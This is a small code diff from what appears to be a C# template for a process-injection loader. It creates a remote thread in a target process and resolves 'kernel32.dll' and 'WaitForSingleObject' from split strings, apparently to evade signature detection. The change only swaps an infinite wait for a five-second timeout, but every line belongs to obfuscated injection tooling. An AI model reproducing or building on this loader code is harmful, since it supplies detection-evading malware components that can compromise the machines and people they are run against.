@@ -40,7 +40,7 @@ namespace {{ namespace }}
             IntPtr _ht;
             _nt(out _ht, 0x1FFFFF, IntPtr.Zero, _h, _addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             
-            _mfd._mfg<Action<IntPtr, uint>>("ker" + "nel32.dll", "Wait" + "ForSin" + "gleOb" + "ject")(_ht, 0xFFFFFFFF);
+            _mfd._mfg<Action<IntPtr, uint>>("ker" + "nel32.dll", "Wait" + "ForSin" + "gleOb" + "ject")(_ht, 5000);
         }
     }
 
